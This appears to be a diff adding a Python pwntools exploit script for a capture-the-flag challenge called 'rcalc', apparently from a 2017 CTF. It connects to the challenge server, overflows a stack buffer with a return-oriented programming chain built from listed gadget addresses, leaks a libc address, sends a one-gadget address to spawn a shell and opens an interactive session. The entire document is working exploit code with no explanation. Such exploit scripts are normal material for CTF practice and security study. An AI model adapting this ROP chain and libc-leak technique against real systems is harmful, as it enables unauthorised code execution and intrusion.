@@ -1,0 +1,40 @@
+from pwn import *
+gadget1 = 0x0000000000401123 # pop rdi ; ret
+gadget2 = 0x0000000000401121 # pop rsi ; pop r15 ; ret
+#s = remote('192.168.0.85',1234)
+s = remote('rcalc.2017.teamrois.cn', 2333)
+def add(op1,op2):
+  s.recvuntil('Your choice:')
+  s.send('1\n')
+  s.recvuntil('input 2 integer: ')
+  s.send(str(op1)+'\n')
+  s.send(str(op2)+'\n')
+  s.recvuntil('result?')
+  s.send('yes\n')
+s.recvuntil('pls:')
+dat = 'A'*0x108
+dat += p64(0x42424242)
+dat += p64(0x00602500-0x8)
+dat += p64(gadget1)
+dat += p64(0x0601FF0)
+dat += p64(gadget2)
+dat += p64(0)
+dat += p64(0)
+dat += p64(0x0400850)
+dat += p64(gadget1)
+dat += p64(0x0401203)
+dat += p64(gadget2)
+dat += p64(0x00602500)
+dat += p64(0)
+dat += p64(0x04008E0 )
+dat += p64(0x0000000000400f9f)
+s.send(dat+'\n')
+for i in xrange(34):
+  add(1234,1234)
+add(555819297,555819297)
+s.recvuntil('Your choice:')
+s.send('5\n')
+libc = u64(s.recvuntil('\x7f')+'\x00\x00') - 0x20740
+log.info("LIBC : 0x%x"%libc)
+s.send(p64(libc+0x4526a)+'\n')
+s.interactive()
